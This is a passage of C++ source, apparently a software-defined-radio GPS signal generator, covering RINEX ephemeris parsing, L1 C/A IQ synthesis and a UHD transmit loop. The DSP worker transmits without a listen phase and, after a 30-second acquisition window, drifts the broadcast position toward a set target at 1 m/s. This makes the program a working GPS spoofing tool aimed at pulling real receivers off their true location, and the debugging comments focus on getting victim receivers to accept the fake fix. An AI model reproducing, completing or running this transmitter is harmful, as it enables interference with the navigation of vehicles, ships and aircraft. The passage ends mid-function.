// Broadcast ephemeris usable window (gpssim.c uses ±1 h for toc; receivers ~2–4 h).
// FIX-AGE: Raised from 7200 (2 h) to 14400 (4 h) so that yesterday's RINEX file
// (which has toe ~28 h behind wall-clock) still passes when --rinex-time is used.
// With --rinex-time, gps_tow = freshest_toe + 30 → age ≈ 30 s — always passes.
static constexpr double MAX_EPH_AGE_SEC = 14400.0; // 4 hours

// ── GPS week number ambiguity helper ─────────────────────────────────────────
// RINEX 2.11 stores the GPS week as a full week number (e.g. 2312) but some
// older files or writers store it modulo 1024 (rollover every ~19.7 years).
// SatCalc needs the toe expressed as GPS seconds-of-week relative to the
// OBSERVER'S current time.  If eph.week is off by 1024 the time delta is
// ~7168 days — the satellite's computed position is nowhere near Earth's orbit.
//
// Resolve: if |eph.week - current_gps_week| > 512, assume a rollover and
// add 1024 to the stored week number.
static int resolve_gps_week(int eph_week, double gps_tow_seconds) {
    // Derive current GPS week from TOW.  TOW is seconds into the current week.
    // We infer the current week from the system clock the same way main() does.
    const auto now = std::chrono::system_clock::now();
    const long unix_s = std::chrono::duration_cast<std::chrono::seconds>(
                            now.time_since_epoch()).count();
    const long gps_s  = unix_s - 315'964'800L + 18L;  // GPS epoch + leap seconds
    const int  current_week = static_cast<int>(gps_s / 604800L);

    int week = eph_week;
    // Resolve rollover: if more than 512 weeks apart, add 1024
    while ((current_week - week) > 512) week += 1024;
    while ((week - current_week) > 512) week -= 1024;
    return week;
}

static bool is_visible(const Ephemeris& eph,
                        double obs_lat, double obs_lon, double obs_alt,
                        double gps_tow,
                        const IonoModel* iono = nullptr)
{
    // Resolve GPS week rollover before calling SatCalc.
    Ephemeris e_resolved = eph;
    e_resolved.week = resolve_gps_week(eph.week, gps_tow);

    try {
        const WGS84 obs{obs_lat, obs_lon, obs_alt};
        const TargetState ts = SatCalc::calculate_target(e_resolved, obs, gps_tow,
                                                         ECEFVel{}, iono);

        // Always print every SV's computed elevation so the operator can
        // diagnose whether SatCalc is working and what the sky looks like.
        // This runs only during constellation loading (not in the hot DSP loop).
        std::cout << "[VIS] SV" << std::setw(2) << eph.sv_id
                  << " week=" << eph.week << "→" << e_resolved.week
                  << " el=" << std::fixed << std::setprecision(1)
                  << ts.elevation_deg << "°"
                  << " az=" << std::setw(6) << ts.azimuth_deg << "°"
                  << " dop=" << std::setw(8) << std::setprecision(0)
                  << ts.doppler_hz << " Hz"
                  << (ts.elevation_deg >= EL_MASK_DEG ? "  ✓" : "  (below mask)")
                  << "\n" << std::flush;

        return ts.elevation_deg >= EL_MASK_DEG;
    } catch (const std::exception& ex) {
        // Log to both cerr AND fprintf(stderr) to guarantee visibility
        // regardless of C++ stream buffering state.
        fprintf(stderr, "[VIS] SV%d exception: %s\n", eph.sv_id, ex.what());
        std::cerr << "[VIS] SV" << eph.sv_id << " exception: " << ex.what() << "\n" << std::flush;
        return false;
    } catch (...) {
        fprintf(stderr, "[VIS] SV%d unknown exception\n", eph.sv_id);
        std::cerr << "[VIS] SV" << eph.sv_id << " unknown exception\n" << std::flush;
        return false;
    }
}

// ── Dynamic RINEX URL builder ─────────────────────────────────────────────────
// Computes today's UTC date from the system clock and builds the CDDIS
// broadcast ephemeris URL in the form:
//   https://cddis.nasa.gov/archive/gnss/data/daily/YYYY/brdc/brdcDDD0.YYn
// where YYYY = 4-digit year, DDD = 3-digit day-of-year, YY = 2-digit year.
//
// Day-of-year is computed from a Julian Day Number so that leap years and
// month lengths are handled correctly with no look-up tables.
static std::string build_rinex_url() {
    // Get current UTC time via system_clock (C++17 guarantees UTC epoch).
    const auto now = std::chrono::system_clock::now();
    const std::time_t t = std::chrono::system_clock::to_time_t(now);
    std::tm utc{};
#if defined(_WIN32)
    gmtime_s(&utc, &t);
#else
    gmtime_r(&t, &utc);
#endif
    const int year  = utc.tm_year + 1900;   // full 4-digit year
    const int doy   = utc.tm_yday + 1;       // day-of-year [1..366]
    const int yy    = year % 100;            // 2-digit year for filename

    // Format: brdcDDD0.YYn  — DDD zero-padded to 3 digits, YY to 2 digits
    char buf[256];
    std::snprintf(buf, sizeof(buf),
        "https://cddis.nasa.gov/archive/gnss/data/daily/%04d/brdc/brdc%03d0.%02dn",
        year, doy, yy);
    return std::string(buf);
}

// Return type bundles the visible ephemerides with the ionospheric params
// parsed from the RINEX file header so they can be broadcast in SF4 Page 18.
struct ConstellationResult {
    std::vector<Ephemeris> ephs;
    KlobucharParams        iono;
    double                 freshest_toe = -1.0;  // newest toe in entire RINEX file
};

static ConstellationResult generate_live_constellation(
    const std::string& rinex_path,
    double obs_lat, double obs_lon, double obs_alt, double gps_tow)
{
    ConstellationResult result;

    // FIX (Problem 3 — NASA HTML Block):
    // The previous code used curl to download from cddis.nasa.gov, which now
    // requires a login and returns an HTML page instead of RINEX data.
    // The parser read the HTML, found no satellite records, returned 0 SVs,
    // and the program crashed immediately.
    //
    // Fix: the C++ code no longer downloads anything.  The operator provides
    // a pre-downloaded RINEX 2.11 file via --rinex <path>.  build_rinex_url()
    // is called only in main() to print the correct URL for the operator.
    std::ifstream file(rinex_path);
    if (!file.is_open()) {
        std::cerr << "[RINEX][ERROR] Cannot open file: " << rinex_path << "\n";
        return result;
    }
    std::cout << "[RINEX] Reading: " << rinex_path << "\n";

    std::string line;

    // ── Parse RINEX 2.11 header for Klobuchar coefficients ───────────────────
    // FIX (Flaw 4): RINEX 2.11 broadcasts the 8 Klobuchar coefficients in two
    // header records labelled "ION ALPHA" and "ION BETA".  We parse them here
    // so they can be inserted verbatim into SF4 Page 18 of the LNAV message,
    // giving receivers a correct ionospheric model and eliminating the
    // "Unreliable" fix rejection caused by an atmospheric error discrepancy.
    //
    // RINEX 2.11 §5.1 header record format:
    //   ION ALPHA  col 3-14: alpha0  col 15-26: alpha1 ... (D-exponent notation)
    //   ION BETA   col 3-14: beta0   col 15-26: beta1  ...
    // ── parse_rinex_field: correct fixed-width RINEX 2.11 number extractor ───
    // RINEX 2.11 uses fixed D19.12 fields with NO guaranteed space separator.
    // When a value is negative its '-' occupies the last character of the
    // PREVIOUS field's 19-character slot, so a naive substr(col, 19) captures
    // a trailing '-' on field N and misses the leading '-' on field N+1.
    //
    // This parser peeks one character to the LEFT of each nominal column:
    //   • If s[col-1] is '+' or '-', that sign belongs to THIS field — shift
    //     the window one character left so the sign is included.
    //   • Strip any trailing '+' or '-' from the extracted 19-char window
    //     (those belong to the NEXT field).
    // After sign handling, replace FORTRAN 'D'/'d' exponent with 'e', trim
    // whitespace, and convert with std::stod.
    auto parse_rinex_field = [](const std::string& s, int col) -> double {
        if (col >= static_cast<int>(s.size())) return 0.0;
        // Peek left: sign stolen from previous field's trailing space?
        int start = col;
        if (col > 0 && s[col - 1] == '-') start = col - 1;
        else if (col > 0 && s[col - 1] == '+') start = col - 1;
        std::string raw = s.substr(static_cast<size_t>(start),
                                   std::min(19, static_cast<int>(s.size()) - start));
        // Strip trailing sign that belongs to the next field
        while (!raw.empty() && (raw.back() == '-' || raw.back() == '+'))
            raw.pop_back();
        // Replace FORTRAN D/d exponent notation with 'e'
        for (char& c : raw) if (c == 'D' || c == 'd') c = 'e';
        // Trim whitespace
        const size_t first = raw.find_first_not_of(" \t\r\n");
        if (first == std::string::npos) return 0.0;
        raw = raw.substr(first);
        try { return std::stod(raw); } catch (...) { return 0.0; }
    };

    // ── Parse RINEX 2.11 header for Klobuchar coefficients ───────────────────
    // RINEX 2.11 header ION ALPHA/BETA lines are space-separated (12-char
    // fields, always positive or with leading minus — no merging occurs in
    // 12-char fields at typical iono values).  sscanf handles them correctly
    // after D→e substitution, so we keep that approach for the header.
    //
    // FIX (BUG): The END OF HEADER check MUST come BEFORE the D→e
    // substitution.  "END OF HEADER" contains uppercase 'D' (in "END") and
    // uppercase 'D' again (in "HEADER"), so after the substitution loop the
    // string becomes "ENe OF HEAeER" — which never matches
    // line.find("END OF HEADER").  The header loop then consumes the entire
    // RINEX body, leaving the file at EOF before the body-parsing loop runs.
    // Result: "Parsed 0 records, accepted 0, visible 0 SVs".
    //
    // "ION ALPHA" and "ION BETA" contain no 'D' or 'd', so they are
    // unaffected by the ordering change and still match after substitution.
    while (std::getline(file, line)) {
        // These checks MUST come BEFORE the D→e substitution below.
        // "END OF HEADER" and "DELTA-UTC" both contain the letter 'D', which
        // the substitution would destroy before we could match on them.
        if (line.find("END OF HEADER") != std::string::npos) break;
        const bool is_delta_utc    = (line.find("DELTA-UTC")    != std::string::npos);
        const bool is_leap_seconds = (line.find("LEAP SECONDS") != std::string::npos);

        for (char& c : line) if (c == 'D' || c == 'd') c = 'e';

        if (line.find("ION ALPHA") != std::string::npos) {
            sscanf(line.c_str(), " %lf %lf %lf %lf",
                   &result.iono.alpha[0], &result.iono.alpha[1],
                   &result.iono.alpha[2], &result.iono.alpha[3]);
            result.iono.valid = true;
        } else if (line.find("ION BETA") != std::string::npos) {
            sscanf(line.c_str(), " %lf %lf %lf %lf",
                   &result.iono.beta[0], &result.iono.beta[1],
                   &result.iono.beta[2], &result.iono.beta[3]);
        } else if (is_delta_utc) {
            // RINEX 2.11 format (after D→e substitution):
            //   "   A0_sci  A1_sci   tot_int  wnt_int DELTA-UTC: A0,A1,T,W"
            // e.g. "   -0.186264514923e-08 0.532907051820e-14   147456     2415 ..."
            sscanf(line.c_str(), " %lf %lf %d %d",
                   &result.iono.A0, &result.iono.A1,
                   &result.iono.tot, &result.iono.wnt);
        } else if (is_leap_seconds) {
            // RINEX 2.11 format: "    18                                    LEAP SECONDS"
            int ls = 0;
            if (sscanf(line.c_str(), " %d", &ls) == 1 && ls > 0) {
                result.iono.dtls  = ls;
                result.iono.dtlsf = ls;  // no upcoming event → future = current
            }
        }
    }

    if (result.iono.valid) {
        std::cout << "[RINEX] Klobuchar iono params parsed from header:\n"
                  << std::scientific << std::setprecision(3)
                  << "        alpha: " << result.iono.alpha[0] << "  "
                  << result.iono.alpha[1] << "  "
                  << result.iono.alpha[2] << "  "
                  << result.iono.alpha[3] << "\n"
                  << "        beta:  " << result.iono.beta[0]  << "  "
                  << result.iono.beta[1]  << "  "
                  << result.iono.beta[2]  << "  "
                  << result.iono.beta[3]  << "\n"
                  << std::fixed << std::setprecision(6);
    } else {
        std::cerr << "[RINEX][WARN] ION ALPHA/BETA not found in header — "
                     "using ITU-R nominal defaults for SF4 Page 18.\n";
    }

    std::cout << "[RINEX] *** Visibility check — TOW=" << std::fixed
              << std::setprecision(1) << gps_tow << " s"
              << "  obs=(" << obs_lat << "°N " << obs_lon << "°E "
              << obs_alt << "m)  mask=" << EL_MASK_DEG << "° ***\n";

    const IonoModel vis_iono = make_iono_model(result.iono);

    auto is_epoch_line = [](const std::string& s) -> bool {
        // An epoch line starts with an optional space then a 1-or-2-digit PRN.
        // Body lines start with 3 spaces then a digit or '-'.
        // The simplest discriminator: col 2 is a space for body, non-space digit for epoch.
        if (s.size() < 3) return false;
        // Body lines: "   " at col 0-2 (3 spaces before the data field)
        // Epoch lines: " X " or "XX " where X is a digit
        // Distinguish: if s[2] == ' ' it's a body line indent; if s[2] is digit it's epoch
        return std::isdigit(static_cast<unsigned char>(s[2])) ||
               (s[0] == ' ' && std::isdigit(static_cast<unsigned char>(s[1])));
    };

    auto parse_epoch_sv_id = [](const std::string& s) -> int {
        // Read PRN from cols 0-1, tolerating a leading space.
        // Uses strtol to avoid any sscanf width-vs-whitespace ambiguity.
        char buf[4] = {};
        buf[0] = s.size() > 0 ? s[0] : ' ';
        buf[1] = s.size() > 1 ? s[1] : ' ';
        buf[2] = '\0';
        char* end = nullptr;
        long v = std::strtol(buf, &end, 10);
        return (end != buf) ? static_cast<int>(v) : -1;
    };

    auto parse_epoch_clocks = [](const std::string& s,
                                 double& af0, double& af1, double& af2) {

        std::string el = s;
        for (char& c : el) if (c=='D'||c=='d') c='e';
        const char* p = el.c_str();
        char* end = nullptr;
        int skip = 7;  // sv_id + yr + mo + da + hr + mn + sec
        while (skip-- > 0) {
            strtod(p, &end);          // also handles integers
            if (end == p) { strtol(p, &end, 10); } // fallback for pure int token
            if (end == p) break;
            p = end;
        }
        af0 = strtod(p, &end); p = end;
        af1 = strtod(p, &end); p = end;
        af2 = strtod(p, &end);
    };

    // Count lines consumed so we can report parse stats
    int total_records_attempted = 0;
    int total_records_accepted  = 0;

    while (std::getline(file, line)) {
        // Always grab exactly 7 more lines to stay aligned, regardless of validation.
        std::string orbit[7];
        for (int oi = 0; oi < 7; ++oi) {
            if (!std::getline(file, orbit[oi])) orbit[oi] = "";
        }

        // Skip blank / too-short lines (shouldn't occur mid-body but be safe)
        if (line.empty() || line.size() < 10) continue;

        // Validate epoch line
        int sv_id = parse_epoch_sv_id(line);
        if (sv_id < 1 || sv_id > 32) {
            // Not an epoch line (e.g. we landed on a body line somehow).
            // Logged so the operator can spot any residual desync.
            fprintf(stderr, "[RINEX][SKIP] Non-epoch line (sv_id=%d): %.40s\n",
                    sv_id, line.c_str());
            fflush(stderr);
            continue;
        }

        total_records_attempted++;

        Ephemeris e{};
        e.sv_id = sv_id;

        // Parse clock fields from epoch line
        parse_epoch_clocks(line, e.af0, e.af1, e.af2);

        // Parse 7 orbit lines
        const std::string& o1 = orbit[0]; // IODE Crs delta_n M0
        const std::string& o2 = orbit[1]; // Cuc e Cus sqrt_A
        const std::string& o3 = orbit[2]; // toe Cic omega0 Cis
        const std::string& o4 = orbit[3]; // i0 Crc omega omega_dot
        const std::string& o5 = orbit[4]; // idot codesOnL2 week L2flag
        const std::string& o6 = orbit[5]; // SV_acc health Tgd IODC
        // orbit[6] = transmission time / fit — skip

        e.Crs     = parse_rinex_field(o1, 22);
        e.delta_n = parse_rinex_field(o1, 41);
        e.M0      = parse_rinex_field(o1, 60);

        e.Cuc    = parse_rinex_field(o2,  3);
        e.e      = parse_rinex_field(o2, 22);
        e.Cus    = parse_rinex_field(o2, 41);
        e.sqrt_A = parse_rinex_field(o2, 60);

        e.toe    = parse_rinex_field(o3,  3);
        e.Cic    = parse_rinex_field(o3, 22);
        e.omega0 = parse_rinex_field(o3, 41);
        e.Cis    = parse_rinex_field(o3, 60);

        e.i0        = parse_rinex_field(o4,  3);
        e.Crc       = parse_rinex_field(o4, 22);
        e.omega     = parse_rinex_field(o4, 41);
        e.omega_dot = parse_rinex_field(o4, 60);

        e.idot = parse_rinex_field(o5,  3);
        e.week = static_cast<int>(parse_rinex_field(o5, 41));

        // IODE from orbit line 1, col 3 (same as gpssim: str+3)
        e.IODE = static_cast<int>(std::round(parse_rinex_field(o1, 3)));
        // IODC from orbit line 6, col 60 (same as gpssim: str+60)
        e.IODC = static_cast<int>(std::round(parse_rinex_field(o6, 60)));
        e.Tgd  = parse_rinex_field(o6, 41);

        // toc from epoch header timestamp (NOT toe!)
        // Clock correction: af0 + af1*(t-toc) + af2*(t-toc)^2
        // toc can differ from toe by up to 2 hours. Setting toc=toe causes
        // wrong pseudorange corrections → position errors → no fix.
        {
            // RINEX 2.11 epoch header: " SV YY MM DD HH MM SS.S af0 af1 af2"
            // Columns: 3-4=YY, 6-7=MM, 9-10=DD, 12-13=HH, 15-16=MM, 17-22=SS.S
            int yy = std::atoi(line.substr(3, 2).c_str());
            int mm = std::atoi(line.substr(6, 2).c_str());
            int dd = std::atoi(line.substr(9, 2).c_str());
            int hh = std::atoi(line.substr(12, 2).c_str());
            int mn = std::atoi(line.substr(15, 2).c_str());
            double ss = std::atof(line.substr(17, 5).c_str());
            int yr = (yy >= 80) ? 1900 + yy : 2000 + yy;

            // Convert calendar date to Julian Day Number
            if (mm <= 2) { yr--; mm += 12; }
            int JD = 365*yr + yr/4 - yr/100 + yr/400 + (153*(mm+1))/5 + dd + 1721119;
            // GPS epoch: January 6, 1980 = JD 2444245
            int gps_days = JD - 2444245;
            int gps_week = gps_days / 7;
            double toc_tow = (gps_days % 7) * 86400.0 + hh*3600.0 + mn*60.0 + ss;
            e.toc = toc_tow;
            (void)gps_week; // week already parsed from orbit line
        }

        // Sanity check: physically impossible values mean a parse error
        if (e.sqrt_A < 1000.0 || e.sqrt_A > 10000.0 ||
            e.e < 0.0          || e.e > 0.99) {
            fprintf(stderr,
                "[RINEX][BADEPH] SV%d: sqrt_A=%.3f e=%.6f — skipping\n",
                e.sv_id, e.sqrt_A, e.e);
            fflush(stderr);
            continue;
        }

        e.week = resolve_gps_week(e.week, gps_tow);

        if (e.toe > result.freshest_toe)
            result.freshest_toe = e.toe;

        // Guaranteed parse-success diagnostic before any orbital computation
        fprintf(stderr, "[PARSE] SV%2d week=%d toe=%.0f e=%.6f sqrtA=%.3f M0=%+.4f\n",
                e.sv_id, e.week, e.toe, e.e, e.sqrt_A, e.M0);
        fflush(stderr);

        total_records_accepted++;

        // FIX (Flaw 2): real elevation check via SatCalc, not placeholder.
        if (is_visible(e, obs_lat, obs_lon, obs_alt, gps_tow, &vis_iono)) {
            result.ephs.push_back(e);
        }
    }

    std::cout << "[RINEX] Parsed " << total_records_attempted
              << " records, accepted " << total_records_accepted
              << ", visible " << result.ephs.size()
              << " SVs above " << EL_MASK_DEG << "° elevation mask.\n" << std::flush;

    return result;
}

// =============================================================================
// SECTION 10: GLOBAL STATE
// =============================================================================

static std::atomic<bool> g_stop{false};
static void sig_handler(int) noexcept { g_stop.store(true); }

// RX worker removed — TX-only mode. No receiving needed.


static void dsp_worker(
    std::vector<SvState>&  sv_states,
    const WGS84&           user_pos,
    const WGS84&           final_target,
    double                 initial_gps_tow,
    TxRing&                tx_ring,
    const IonoModel&       iono_model,
    float                  amplitude_scale_arg)  // 0 = auto (0.8/N_SV)
{
    uhd::set_thread_priority_safe();

    double   gps_tow  = initial_gps_tow;
    uint64_t ms_count = 0;
    uint64_t blocks   = 0;
    auto     t_start  = std::chrono::steady_clock::now();

    const uint64_t gps_ms_base =
        static_cast<uint64_t>(std::round(initial_gps_tow * 1000.0));

    // Use caller-supplied amplitude or auto (0.8/N_SV).
    const float amplitude_scale = (amplitude_scale_arg > 0.0f)
        ? amplitude_scale_arg
        : TX_AMPLITUDE_SCALE;

    // Drift starts after this delay (ms). Set to 0 for immediate drift,
    // or keep a small delay to let the receiver acquire first.
    constexpr uint64_t DRIFT_START_MS = 30'000; // 30s acquisition window

    WGS84 current_pos = user_pos;

    std::cout << "[DSP] TX-ONLY mode. " << sv_states.size() << " SVs, L1 only\n"
              << "[DSP] Nav data: 50 bps LNAV (300-bit subframe, preamble=0x8B)\n"
              << "[DSP] Amplitude: fixed " << amplitude_scale << " per sample\n"
              << "[DSP] Start pos : " << std::fixed << std::setprecision(7)
              << current_pos.lat_deg << "N  " << current_pos.lon_deg << "E\n"
              << "[DSP] Drift target: " << final_target.lat_deg << "N  "
              << final_target.lon_deg << "E (starts after " << DRIFT_START_MS/1000 << "s)\n"
              << "[DSP] Transmitting immediately — no LISTEN/RAMP phase.\n";

    while (!g_stop.load(std::memory_order_relaxed)) {

        // ── Drift position toward target ─────────────────────────────────────
        ECEFVel current_vel_ecef{};

        if (ms_count >= DRIFT_START_MS) {
            constexpr double M_PER_DEG_LAT = 111320.0;
            const double lat_rad = current_pos.lat_deg * M_PI / 180.0;
            const double lon_rad = current_pos.lon_deg * M_PI / 180.0;
            const double cos_lat = std::cos(lat_rad);
            const double m_per_deg_lon = M_PER_DEG_LAT * (cos_lat > 1e-6 ? cos_lat : 1e-6);

            // Residual to target in metres
            const double dlat_m = (final_target.lat_deg - current_pos.lat_deg) * M_PER_DEG_LAT;
            const double dlon_m = (final_target.lon_deg - current_pos.lon_deg) * m_per_deg_lon;
            const double dist_m = std::sqrt(dlat_m * dlat_m + dlon_m * dlon_m);

            if (dist_m > 0.01) { // > 1 cm away — keep drifting
                const double inv_dist = 1.0 / dist_m;
                // 1 m/s → 0.001 m per millisecond step
                constexpr double STEP_M = 0.001; // 1 m/s × 1 ms
                const double step_lat_deg = (dlat_m * inv_dist) * STEP_M / M_PER_DEG_LAT;
                const double step_lon_deg = (dlon_m * inv_dist) * STEP_M / m_per_deg_lon;
                current_pos.lat_deg += step_lat_deg;
                current_pos.lon_deg += step_lon_deg;

                // Convert 1 m/s ENU drift velocity to ECEF for kinematic Doppler.
                // The drift direction in ENU: north = dlat_m/dist_m, east = dlon_m/dist_m.
                // ENU → ECEF rotation (v_up = 0 — altitude is constant):
                //   vx = −sin(lon)·v_east  − sin(lat)·cos(lon)·v_north
                //   vy =  cos(lon)·v_east  − sin(lat)·sin(lon)·v_north
                //   vz =                     cos(lat)           ·v_north
                const double v_north = dlat_m * inv_dist;  // [m/s], unit-vector component
                const double v_east  = dlon_m * inv_dist;  // [m/s], unit-vector component
                const double sin_lat = std::sin(lat_rad);
                const double sin_lon = std::sin(lon_rad);
                const double cos_lon = std::cos(lon_rad);
                current_vel_ecef.vx = -sin_lon * v_east - sin_lat * cos_lon * v_north;
                current_vel_ecef.vy =  cos_lon * v_east - sin_lat * sin_lon * v_north;
                current_vel_ecef.vz =  cos_lat * v_north;
            }
            // Once within 1 cm of target, lock position — no overshoot oscillation.
            // current_vel_ecef stays zero (receiver has stopped drifting).
        }



        // ── 5. Synthesize all SVs using gpssim.c's proven IQ method ────────
        TxBlock tx;
        tx.ch0.fill(std::complex<float>(0.0f, 0.0f));

        const double delt = 1.0 / SAMPLE_RATE_HZ;

        // Convert current position to ECEF for range computation
        double llh[3] = {
            current_pos.lat_deg * M_PI / 180.0,
            current_pos.lon_deg * M_PI / 180.0,
            current_pos.alt_m
        };
        double user_xyz[3];
        {
            double a = 6378137.0, e = 0.0818191908426, e2 = e*e;
            double slat = sin(llh[0]), clat = cos(llh[0]);
            double slon = sin(llh[1]), clon = cos(llh[1]);
            double d = e * slat;
            double n = a / sqrt(1.0 - d*d);
            double nph = n + llh[2];
            user_xyz[0] = nph * clat * clon;
            user_xyz[1] = nph * clat * slon;
            user_xyz[2] = ((1.0 - e2) * n + llh[2]) * slat;
        }

        // ── Nav message refresh every 30 s ──────────────────────────────────
        // CRITICAL FIX: Only regenerate dwrd[] content (HOW TOW update).
        // DO NOT call gps_computeCodePhase here — it resets iword/ibit/icode
        // to iword=8 every 30 s, teleporting the nav bit pointer backwards.
        // The receiver needs a CONTINUOUS subframe stream to complete the
        // 5-subframe decode (SF1+SF2+SF3 = 30 s minimum). Resetting mid-stream
        // breaks subframe synchronisation → permanent "no fix".
        // iword/ibit/icode are advanced exclusively by the per-sample hot loop.
        static uint64_t last_nav_update_s = UINT64_MAX;
        uint64_t current_aligned = ((uint64_t)(gps_tow + 0.5)) / 30 * 30;
        if (current_aligned != last_nav_update_s) {
            const bool is_init = (last_nav_update_s == UINT64_MAX);
            for (SvState& sv : sv_states) {
                // generateNavMsg updates dwrd[] with correct HOW TOW for this
                // 30 s window. is_init=false on subsequent calls — it copies
                // dwrd[50..59] to dwrd[0..9] so the pre-roll stays valid.
                sv.chan.generateNavMsg(sv.eph.week, gps_tow, is_init);
                // ← NO computeCodePhase call here.
            }
            last_nav_update_s = current_aligned;

            if (ms_count > 0 && !sv_states.empty()) {
                std::cout << "[NAV-DEBUG] TOW=" << std::fixed << std::setprecision(1) << gps_tow
                          << " | SV" << sv_states[0].sv_id
                          << " iword=" << sv_states[0].chan.iword   // should advance each call
                          << " ibit=" << sv_states[0].chan.ibit
                          << " icode=" << sv_states[0].chan.icode << "\n";
            }
        }

        // ── Doppler refresh every 100 ms ────────────────────────────────────
        // CRITICAL FIX: Only update f_carr / f_code (Doppler). DO NOT call
        // gps_computeCodePhase — it resets iword/ibit/icode to a pseudorange-
        // derived value, teleporting the nav pointer every 100 ms → no fix.
        if (ms_count % 100 == 0 && ms_count > 0) {
            for (SvState& sv : sv_states) {
                GpsRange rho0_d, rho1_d;
                gps_computeRange(&rho0_d, sv.eph, gps_tow - 0.1, sv.eph.week, user_xyz, &iono_model);
                gps_computeRange(&rho1_d, sv.eph, gps_tow,        sv.eph.week, user_xyz, &iono_model);
                // Update only the frequency scalars, leave nav pointers alone.
                double rhorate = (rho1_d.range - rho0_d.range) / 0.1;
                sv.chan.f_carr = -rhorate / 0.190293672798365;          // LAMBDA_L1
                sv.chan.f_code = GPS_CODE_FREQ + sv.chan.f_carr * (1.0 / 1540.0); // CARR_TO_CODE
            }
        }

        for (SvState& sv : sv_states) {
            // gpssim.c IQ synthesis — per-sample loop
            for (size_t isamp = 0; isamp < SAMPLES_PER_MS; isamp++) {
                int iTable = (int)(sv.chan.carr_phase * 512.0) & 0x1ff;
                int ip = sv.chan.dataBit * sv.chan.codeCA * cosTable512[iTable];
                int qp = sv.chan.dataBit * sv.chan.codeCA * sinTable512[iTable];

                tx.ch0[isamp] += std::complex<float>(
                    static_cast<float>(ip) / 250.0f,
                    static_cast<float>(qp) / 250.0f);

                // Update code phase
                sv.chan.code_phase += sv.chan.f_code * delt;
                if (sv.chan.code_phase >= GPS_CA_SEQ_LEN) {
                    sv.chan.code_phase -= GPS_CA_SEQ_LEN;
                    sv.chan.icode++;
                    if (sv.chan.icode >= 20) {
                        sv.chan.icode = 0;
                        sv.chan.ibit++;
                        if (sv.chan.ibit >= 30) {
                            sv.chan.ibit = 0;
                            sv.chan.iword++;
                            // FIX-IWORD: Prevent out-of-bounds on dwrd[] array.
                            // GPS_N_DWRD = 60; valid range is 0..59.
                            // Wrap back to word 10 (start of SF1) on overflow.
                            if (sv.chan.iword >= GPS_N_DWRD)
                                sv.chan.iword = GPS_N_DWRD_SBF; // = 10, first real subframe
                        }
                        sv.chan.dataBit = (int)((sv.chan.dwrd[sv.chan.iword] >> (29 - sv.chan.ibit)) & 0x1UL) * 2 - 1;
                    }
                }
                sv.chan.codeCA = sv.chan.ca[(int)sv.chan.code_phase] * 2 - 1;

                sv.chan.carr_phase += sv.chan.f_carr * delt;
                sv.chan.carr_phase -= floor(sv.chan.carr_phase);
            }
        }

        // ── 6. Apply amplitude scaling ────────────────────────────────────────
        for (size_t i = 0; i < SAMPLES_PER_MS; ++i)
            tx.ch0[i] *= amplitude_scale;

        // ── 7. Push to TX ring (spin-wait on back-pressure) ───────────────────
        while (!tx_ring.try_push(std::move(tx))) {
            if (g_stop.load(std::memory_order_relaxed)) return;
#if defined(__x86_64__) || defined(__i386__)
            __builtin_ia32_pause();
#else
            std::this_thread::yield();
#endif
        }

        // ── 8. Advance time ───────────────────────────────────────────────────
        gps_tow += 1e-3;
        ++ms_count;
        ++blocks;

        // Progress report every 5 seconds
        if (blocks % 5000 == 0) {
            const auto now = std::chrono::steady_clock::now();
            const double elapsed = std::chrono::duration<double>(now - t_start).count();

            const char* phase_str = (ms_count < DRIFT_START_MS) ? "ACQUIRE" : "DRIFT  ";

            std::cout << "\r[DSP] "
                      << std::fixed << std::setprecision(1)
                      << blocks / 1000.0 << "k blk  "
                      << "Phase=" << phase_str << "  "
                      << "Amp=" << std::setprecision(3) << amplitude_scale << "  "
                      << "Pos=(" << std::setprecision(6) << current_pos.lat_deg
                      << "," << current_pos.lon_deg << ")  "
                      << "TxRing=" << tx_ring.approx_size()
                      << "  Rate=" << std::setprecision(1)
                      << blocks / elapsed << " kblk/s   "
                      << std::flush;
        }
    }

    std::cout << "\n[DSP] Worker stopped. " << blocks << " blocks generated.\n";
}

// =============================================================================
// SECTION 13: TX WORKER (single channel 0)
// =============================================================================
//
// Pops TxBlocks, accumulates 10ms batches, sends via single-channel TX stream.
//
// FIX 2/3/5: Single buffer pointer. tx_sa.channels = {0}. No ch1, no MIMO.
// Wire format sc8: 4.096 Msps × 1 channel × 2 bytes = 8.2 MB/s — well below
// USB 3.0's 400 MB/s budget.

static void tx_worker(uhd::tx_streamer::sptr tx_stream, TxRing& tx_ring)
{
    uhd::set_thread_priority_safe();

    std::vector<std::complex<float>> acc_ch0(TX_SPB);
    // FIX 2/3/5: Single buffer pointer vector (no ch1 pointer).
    std::vector<void*> tx_ptrs = {acc_ch0.data()};

    uhd::tx_metadata_t md;
    md.has_time_spec  = false;
    md.start_of_burst = true;
    md.end_of_burst   = false;

    uint64_t total_samples = 0;
    size_t   acc_offset    = 0;
    TxBlock  block;

    std::cout << "[TX] Worker started. Single ch0, L1, wire=sc8, "
              << TX_SPB << " samples/send()\n";

    while (!g_stop.load(std::memory_order_relaxed) || !tx_ring.empty()) {
        if (!tx_ring.try_pop(block)) {
#if defined(__x86_64__) || defined(__i386__)
            __builtin_ia32_pause();
#else
            std::this_thread::yield();
#endif
            continue;
        }

        std::copy(block.ch0.begin(), block.ch0.end(),
                  acc_ch0.begin() + acc_offset);
        acc_offset += SAMPLES_PER_MS;

        if (acc_offset >= TX_SPB) {
            const size_t sent = tx_stream->send(tx_ptrs, TX_SPB, md);
            md.start_of_burst = false;
            total_samples    += sent;
            acc_offset        = 0;

            if (sent != TX_SPB)
                std::cerr << "[TX] Partial send: " << sent << "/" << TX_SPB << "\n";
        }
    }

    if (acc_offset > 0)
        tx_stream->send(tx_ptrs, acc_offset, md);

    md.end_of_burst = true;
    tx_stream->send(tx_ptrs, 0, md);
    std::cout << "\n[TX] Worker stopped. Sent " << total_samples << " samples.\n";
}

// =============================================================================
// SECTION 14: ASYNC ERROR MONITOR
// =============================================================================

static void async_monitor(uhd::tx_streamer::sptr tx_stream)
{
    uhd::async_metadata_t async_md;
    while (!g_stop.load(std::memory_order_relaxed)) {
        if (!tx_stream->recv_async_msg(async_md, 0.05)) continue;
        switch (async_md.event_code) {
            case uhd::async_metadata_t::EVENT_CODE_UNDERFLOW:
                std::cerr << "\n[U] TX UNDERFLOW — reduce N_SV or recompile -O3 -march=native\n";
                break;
            case uhd::async_metadata_t::EVENT_CODE_TIME_ERROR:
                std::cerr << "\n[L] TX LATE — timed burst missed deadline\n";
                break;
            case uhd::async_metadata_t::EVENT_CODE_BURST_ACK:
                break;
            case uhd::async_metadata_t::EVENT_CODE_UNDERFLOW_IN_PACKET:
